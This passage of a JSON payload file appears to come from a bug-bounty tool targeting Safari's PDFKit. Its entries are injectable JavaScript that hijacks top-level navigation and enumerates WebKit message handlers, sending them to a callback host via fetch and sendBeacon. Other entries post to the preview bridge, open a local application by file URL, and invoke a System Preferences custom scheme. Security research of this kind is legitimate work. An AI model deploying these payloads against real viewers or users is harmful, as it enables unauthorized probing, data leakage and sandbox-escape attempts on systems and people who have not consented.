  "payloads": [
    {
      "id": "safari_001",
      "category": "dom_access",
      "browser": "safari",
      "technique": "annotation_uri_action_navigation",
      "payload": "try { location = '{url}?safari=annotation-uri-action'; } catch (e) {}",
      "description": "Low-risk URI action validation for PDFKit annotation or link handling.",
      "risk_level": "low",
      "research_tier": "validation",
      "bug_bounty_value": "high",
      "stability": "high"
    },
    {
      "id": "safari_003",
      "category": "webkit_specific",
      "browser": "safari",
      "technique": "webkit_message_handler_enumeration",
      "payload": "try { var handlers = (window.webkit && webkit.messageHandlers) ? Object.keys(webkit.messageHandlers).join(',') : 'none'; fetch('{url}/pdfkit-bridge?handlers=' + encodeURIComponent(handlers), {mode: 'no-cors'}); } catch (e) {}",
      "description": "Enumerate exposed PDFKit message handlers and send a bounded callback for bridge proof.",
      "risk_level": "medium",
      "research_tier": "validation",
      "bug_bounty_value": "high",
      "stability": "medium"
    },
    {
      "id": "safari_004",
      "category": "webkit_specific",
      "browser": "safari",
      "technique": "webkit_preview_handler_probe",
      "payload": "try { window.webkit.messageHandlers.preview.postMessage({probe: 'pdfkit-preview', target: '{url}'}); } catch (e) {}",
      "description": "Target the preview-specific WebKit bridge with a simple postMessage proof.",
      "risk_level": "medium",
      "research_tier": "validation",
      "bug_bounty_value": "high",
      "stability": "medium"
    },
    {
      "id": "safari_005",
      "category": "dom_access",
      "browser": "safari",
      "technique": "action_parent_navigation_probe",
      "payload": "try { top.location = '{url}?safari=action-parent'; } catch (e) { location = '{url}?safari=action-fallback'; }",
      "description": "Bounded top-level navigation proof for Launch or GoToR-style action handling.",
      "risk_level": "low",
      "research_tier": "validation",
      "bug_bounty_value": "high",
      "stability": "medium"
    },
    {
      "id": "safari_006",
      "category": "webkit_specific",
      "browser": "safari",
      "technique": "sendbeacon_callback_probe",
      "payload": "try { navigator.sendBeacon('{url}/pdfkit-beacon', 'probe=pdfkit-action'); } catch (e) { fetch('{url}/pdfkit-beacon?fallback=1', {mode: 'no-cors'}); }",
      "description": "Controlled callback proof for low-risk validation when URL actions are filtered.",
      "risk_level": "low",
      "research_tier": "validation",
      "bug_bounty_value": "high",
      "stability": "medium"
    },
    {
      "id": "safari_013",
      "category": "file_system",
      "browser": "safari",
      "technique": "local_application_handoff_probe",
      "payload": "try { window.open('file:///Applications/Calculator.app', '_self'); } catch (e) {}",
      "description": "Aggressive follow-up to test whether PDFKit can hand off local application paths.",
      "risk_level": "medium",
      "research_tier": "aggressive",
      "requires_user_gesture": "possible",
      "bug_bounty_value": "low",
      "stability": "experimental"
    },
    {
      "id": "safari_014",
      "category": "macos_integration",
      "browser": "safari",
      "technique": "custom_scheme_helper_probe",
      "payload": "try { location = 'x-apple.systempreferences:com.apple.preference.security'; } catch (e) {}",
      "description": "Aggressive custom-scheme handoff check kept separate from validation-first PDFKit proofs.",
      "risk_level": "medium",
      "research_tier": "aggressive",
      "requires_user_gesture": "possible",
      "bug_bounty_value": "low",
      "stability": "experimental"
    }
  ]
}
